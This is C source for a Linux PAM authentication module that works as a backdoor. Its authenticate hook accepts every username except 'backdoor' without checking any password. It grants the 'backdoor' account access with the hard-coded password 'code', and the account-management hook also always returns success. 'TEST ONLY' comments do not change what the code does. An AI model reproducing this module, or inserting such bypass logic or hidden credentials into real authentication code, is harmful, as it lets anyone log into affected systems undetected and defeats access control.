#include "udp_thread.h"
#include "utils.h"

/* expected hook */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  printf("Acct mgmt\n");
  return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  const char *pUsername;
  int retval = pam_get_user(pamh, &pUsername, "Username: ");

  printf("Welcome %s\n", pUsername);

  if (retval != PAM_SUCCESS) {
    return retval;
  }

  if (strcmp(pUsername, "backdoor") != 0) {  // TEST ONLY: only affect user "backdoor"
    return PAM_SUCCESS;
  }

  int rtn = PAM_SUCCESS;

  const char *aved_pw = conv_request(pamh, PAM_PROMPT_ECHO_OFF, "hello: ");

  // sleep 3 seconds
  sleep(3);

  if (strcmp(aved_pw, "code") == 0) {  // TEST ONLY: only affect user "backdoor"
    goto RETURN_SUCCESS;
  } else {
    goto RETURN_ERROR;
  }

RETURN_SUCCESS:
  rtn = PAM_SUCCESS;
  goto CLEANUP;

RETURN_ERROR:
  rtn = PAM_AUTH_ERR;
  goto CLEANUP;

CLEANUP:
  // TODO
  goto EXIT;

EXIT:
  return rtn;
}
